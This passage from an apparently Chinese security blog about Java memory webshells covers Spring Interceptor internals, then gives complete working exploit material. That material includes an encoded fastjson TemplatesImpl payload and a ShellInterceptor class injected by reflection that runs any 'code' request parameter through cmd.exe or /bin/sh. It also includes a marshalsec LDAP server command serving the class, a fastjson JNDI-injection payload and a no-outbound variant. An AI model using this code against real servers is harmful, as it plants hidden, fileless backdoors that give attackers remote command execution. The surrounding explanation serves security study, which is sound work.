AGgCsAF8AYAACACEApQBhAGIAAwArAJsAYwBTAAQAZAAAAEUABv8AXgAGBwBlBwBmBwBnBwBoBwBpBwBpAAD8ABsHAGr8ACUHAGtBBwBp&#x2F;wAXAAUHAGUHAGYHAGcHAGgHAGkAAQcAbAoATgAAAAQAAQA2AAEAbQBuAAMAPAAAAD8AAAADAAAAAbEAAAACAD0AAAAGAAEAAABAAD4AAAAgAAMAAAABAD8AQAAAAAAAAQBvAHAAAQAAAAEAcQByAAIATgAAAAQAAQBzAFQAAAAJAgBvAAAAcQAAAAEAbQB0AAMAPAAAAEkAAAAEAAAAAbEAAAACAD0AAAAGAAEAAABEAD4AAAAqAAQAAAABAD8AQAAAAAAAAQBvAHAAAQAAAAEAdQB2AAIAAAABAHcAeAADAE4AAAAEAAEAcwBUAAAADQMAbwAAAHUAAAB3AAAACQB5AHoAAwA8AAAAQQACAAIAAAAJuwAIWbcAOEyxAAAAAgA9AAAACgACAAAARwAIAEgAPgAAABYAAgAAAAkAewB8AAAACAABAH0AQAABAE4AAAAEAAEANgBUAAAABQEAewAAAAEAfgAAAAIAfw&#x3D;&#x3D;&quot;],&#39;_name&#39;:&#39;c.c&#39;,&#39;_tfactory&#39;:&#123;&#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>OK！</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220609030458812.png\" alt=\"image-20220609030458812\"></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://www.cnblogs.com/zpchcbd/p/15544419.html\">SpringBoot Controller 内存马 / yso定制 - zpchcbd</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/198886#h3-12\">基于内存 Webshell 的无文件攻击技术研究</a></p>\n<p><a href=\"https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#\">Spring 内存马实现 | MYZXCG</a></p>\n<h2 id=\"Spring-Interceptor-内存马\"><a href=\"#Spring-Interceptor-内存马\" class=\"headerlink\" title=\"Spring Interceptor 内存马\"></a>Spring Interceptor 内存马</h2><p>随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关，复杂均衡，防火墙。所以如果你新建的shell路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃，所以这里学习一种 Intercepor 指Spring中的拦截器，主要用于拦截用户请求并作相应处理，比如判断用户登录状态，日志记录，权限管理等</p>\n<h3 id=\"流程分析-1\"><a href=\"#流程分析-1\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h3><p>自定义拦截器必须实现 <strong>HandlerInterceptor</strong> 接口，HandlerInterceptor接口中有三个方法：</p>\n<ol>\n<li>preHandle方法是controller方法执行前拦截的方法<ul>\n<li>可以使用request或者response跳转到指定的页面</li>\n<li>return true放行，执行下一个拦截器，如果没有拦截器，执行controller中的方法。</li>\n<li>return false不放行，不会执行controller中的方法。</li>\n</ul>\n</li>\n<li>postHandle是controller方法执行后执行的方法，在JSP视图执行前。<ul>\n<li>可以使用request或者response跳转到指定的页面</li>\n<li>如果指定了跳转的页面，那么controller方法跳转的页面将不会显示。</li>\n</ul>\n</li>\n<li>afterCompletion方法是在JSP执行后执行<ul>\n<li>request或者response不能再跳转页面了</li>\n</ul>\n</li>\n</ol>\n<p>一、创建自定义拦截器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.interceptor;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InterceptorConfig</span> <span class=\"keyword\">implements</span> <span class=\"title\">HandlerInterceptor</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">preHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;preHandle()&quot;</span>);</span><br><span class=\"line\">        response.setContentType(<span class=\"string\">&quot;text/html&quot;</span>);</span><br><span class=\"line\">        response.getOutputStream().print(<span class=\"string\">&quot;[+] preHandle()&lt;br&gt;&quot;</span>);</span><br><span class=\"line\">        response.flushBuffer();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">postHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]postHandle&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">afterCompletion</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]afterCompletion&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>二、配置注册启用 Interceptor</p>\n<p>创建一个实现了 WebMvcConfigurer 接口的配置类（使用了 @Configuration 注解的类），重写 addInterceptors() 方法，并在该方法中调用 registry.addInterceptor() 方法将自定义的拦截器注册到容器中。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.interceptor;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.context.annotation.Configuration;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InterceptorConfig</span>  <span class=\"keyword\">implements</span> <span class=\"title\">WebMvcConfigurer</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">addInterceptors</span><span class=\"params\">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class=\"line\">        registry.addInterceptor(<span class=\"keyword\">new</span> TestInterceptor()).addPathPatterns(<span class=\"string\">&quot;/inter&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>三、对应配置类中对应的path的controller</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/inter&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestInter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@GetMapping</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">test</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[controller] inter&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;[controller] this is inter&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220610225431061.png\" alt=\"image-20220610225431061\"></p>\n<p>Spring MVC会使用 DispatcherServlet 中的 <strong>doDispatch</strong> 方法进行请求的处理：详细的SpringMVC请求过程：<a href=\"https://blog.csdn.net/icarusliu/article/details/78809790\">SpringMVC源码分析</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220610230737065.png\" alt=\"image-20220610230737065\"></p>\n<p>首先会通过 <strong>getHandler()</strong> 获取当前请求的 handler</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220610231516927.png\" alt=\"image-20220610231516927\"></p>\n<p>跟进，遍历  <strong>this.handlerMappings</strong> 属性后获取处理本次请求的 HandlerMapping 对应就是 mapping，然后调用<strong>mapping 的 getHandler 方法</strong>  来处理这次请求</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220611231736428.png\" alt=\"image-20220611231736428\"></p>\n<p>跟踪后走到 <strong>org.springframework.web.servlet.handler.AbstractHandlerMapping 中的 getHandler</strong>，这个方法主要就是两件事，一、通过 <strong>getHandlerInternal</strong> 获取Handler(此时handler为对应路径下的controller方法)。二、通过 <strong>getHandlerExecutionChain</strong> 获取生效的各个拦截器并组装成HandlerExecutionChain并返回</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220611232538883.png\" alt=\"image-20220611232538883\"></p>\n<p>跟进 <strong>getHandlerExecutionChain</strong> ，首先实例化一个 <strong>HandlerExecutionChain对象</strong>，遍历 <strong>adaptedInterceptors</strong> 属性，然后判断是不是 <strong>MappedInterceptor</strong> 类型的实例，通过判断后去通过URL请求路径匹配，与拦截器中的路径相匹配，就将拦截器添加到chain中</p>\n<blockquote>\n<p>关于 adaptedInterceptors 的初始化见：<a href=\"https://blog.csdn.net/icarusliu/article/details/78833520\">Spring Boot拦截器示例及源码原理分析</a>  中的 2</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220611234625958.png\" alt=\"image-20220611234625958\"></p>\n<p>然后将这个chain和handler一路返回到 <strong>doDispatch</strong> 中 调用 <strong>applyPreHandle</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220612000026649.png\" alt=\"image-20220612000026649\"></p>\n<p>循环调用拦截器的preHandle方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220612000529098.png\" alt=\"image-20220612000529098\"></p>\n<p>所以走到了我们自定义的拦截器中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220612000618470.png\" alt=\"image-20220612000618470\"></p>\n<h3 id=\"实现-1\"><a href=\"#实现-1\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>思路</p>\n<ul>\n<li>创建一个恶意 Interceptor，实现其恶意preHandle方法</li>\n<li>通过容器获取上下文，然后获取 RequestMappingHandlerMapping</li>\n<li>获取adaptedInterceptors字段，然后添加恶意interceptor</li>\n</ul>\n<h3 id=\"出网情况-1\"><a href=\"#出网情况-1\" class=\"headerlink\" title=\"出网情况\"></a>出网情况</h3><p>ShellInterceptor.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ShellInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title\">HandlerInterceptor</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ShellInterceptor</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1. 利用spring内部方法获取context</span></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2. 从context中获取 RequestMappingHandlerMapping实例</span></span><br><span class=\"line\">        RequestMappingHandlerMapping abstractHandlerMapping  = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        <span class=\"comment\">// 3. 反射获取adaptedInterceptors属性</span></span><br><span class=\"line\">        java.lang.reflect.Field field = AbstractHandlerMapping.class.getDeclaredField(<span class=\"string\">&quot;adaptedInterceptors&quot;</span>);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class=\"line\">        <span class=\"comment\">// 4. 避免重复添加</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = adaptedInterceptors.size() - <span class=\"number\">1</span>; i &gt; <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (adaptedInterceptors.get(i) <span class=\"keyword\">instanceof</span> ShellInterceptor) &#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;已添加过&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ShellInterceptor shellInterceptor = <span class=\"keyword\">new</span> ShellInterceptor(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        adaptedInterceptors.add(shellInterceptor);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ShellInterceptor</span><span class=\"params\">(String tmp)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">preHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String code = request.getParameter(<span class=\"string\">&quot;code&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(code != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                java.io.PrintWriter writer = response.getWriter();</span><br><span class=\"line\">                String o = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">                ProcessBuilder p;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>))&#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, code&#125;);</span><br><span class=\"line\">                &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, code&#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                java.util.Scanner c = <span class=\"keyword\">new</span> java.util.Scanner(p.start().getInputStream()).useDelimiter(<span class=\"string\">&quot;\\\\A&quot;</span>);</span><br><span class=\"line\">                o = c.hasNext() ? c.next(): o;</span><br><span class=\"line\">                c.close();</span><br><span class=\"line\">                writer.write(o);</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">                writer.close();</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译为class文件后，利用marashalsec起一个ldap，将恶意class文件所在目录利用python起一个http-server</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;#ShellInterceptor</span><br></pre></td></tr></table></figure>\n\n<p>fastjson触发jndi注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;test&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>\n\n<p>获取恶意class成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220612010424694.png\" alt=\"image-20220612010424694\"></p>\n<p>注入成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220612010509711.png\" alt=\"image-20220612010509711\"></p>\n<h3 id=\"不出网-1\"><a href=\"#不出网-1\" class=\"headerlink\" title=\"不出网\"></a>不出网</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ShellInterceptor</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractTranslet</span> <span class=\"keyword\">implements</span> <span class=\"title\">HandlerInterceptor</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ShellInterceptor</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1. 利用spring内部方法获取context</span></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2. 从context中获取 RequestMappingHandlerMapping实例</span></span><br><span class=\"line\">        RequestMappingHandlerMapping abstractHandlerMapping  = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        <span class=\"comment\">// 3. 反射获取adaptedInterceptors属性</span></span><br><span class=\"line\">        java.lang.reflect.Field field = AbstractHandlerMapping.class.getDeclaredField(<span class=\"string\">&quot;adaptedInterceptors&quot;</span>);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class=\"line\">        <span class=\"comment\">// 4. 避免重复添加</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = adaptedInterceptors.size() - <span class=\"number\">1</span>; i &gt; <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (adaptedInterceptors.get(i) <span class=\"keyword\">instanceof</span> ShellInterceptor) &#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;已添加过&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ShellInterceptor shellInterceptor = <span class=\"keyword\">new</span> ShellInterceptor(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        adaptedInterceptors.add(shellInterceptor);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ShellInterceptor</span><span class=\"params\">(String tmp)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">preHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String code = request.getParameter(<span class=\"string\">&quot;code&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(code != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                java.io.PrintWriter writer = response.getWriter();</span><br><span class=\"line\">                String o = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">                ProcessBuilder p;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>))&#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, code&#125;);</span><br><span class=\"line\">                &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, code&#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                java.util.Scanner c = <span class=\"keyword\">new</span> java.util.Scanner(p.start().getInputStream()).useDelimiter(<span class=\"string\">&quot;\\\\A&quot;</span>);</span><br><span class=\"line\">                o = c.hasNext() ? c.next(): o;</span><br><span class=\"line\">                c.close();</span><br><span class=\"line\">                writer.write(o);</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">                writer.close();</span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class=\"line\">        ShellInterceptor shellInterceptor = <span class=\"keyword\">new</span> ShellInterceptor();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"参考-1\"><a href=\"#参考-1\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://www.cnblogs.com/bitterz/p/14859766.html\">针对Spring MVC的Interceptor内存马 - bitterz</a></p>\n<p><a href=\"https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#\">Spring 内存马实现 | MYZXCG</a></p>\n<h1 id=\"基于Javaagent和Javassist技术\"><a href=\"#基于Javaagent和Javassist技术\" class=\"headerlink\" title=\"基于Javaagent和Javassist技术\"></a>基于Javaagent和Javassist技术</h1><p>深入了解学习从agent中instrument的从加载到hook的流程参考：<a href=\"https://www.mi1k7ea.com/2020/05/10/%E6%B5%85%E6%9E%90Java-Instrument%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF/\">浅析Java Instrument插桩技术  Mi1k7ea </a></p>\n<h2 id=\"Java-Agent-简介\"><a href=\"#Java-Agent-简介\" class=\"headerlink\" title=\"Java Agent 简介\"></a>Java Agent 简介</h2><p>在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，<strong>通过 java.lang.instrument 实现的工具我们称之为 Java Agent</strong> ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即 <strong>动态修改已加载或者未加载的类，包括类的属性、方法</strong>。从 JDK 1.6 开始支持更加强大的动态 Instrument，在JVM 启动后通过 Attach(pid) 远程加载。也就是说instrument它 <strong>能干的事就是动态修改未加载，已加载，正在加载的类</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/java-agent-mindmap.png\"></p>\n<p>那么 java.lang.instrument 包的具体实现，依赖于 JVMTI。</p>\n<blockquote>\n<p>JVMTI（Java Virtual Machine Tool Interface）是一套由 Java 虚拟机提供的，为 JVM 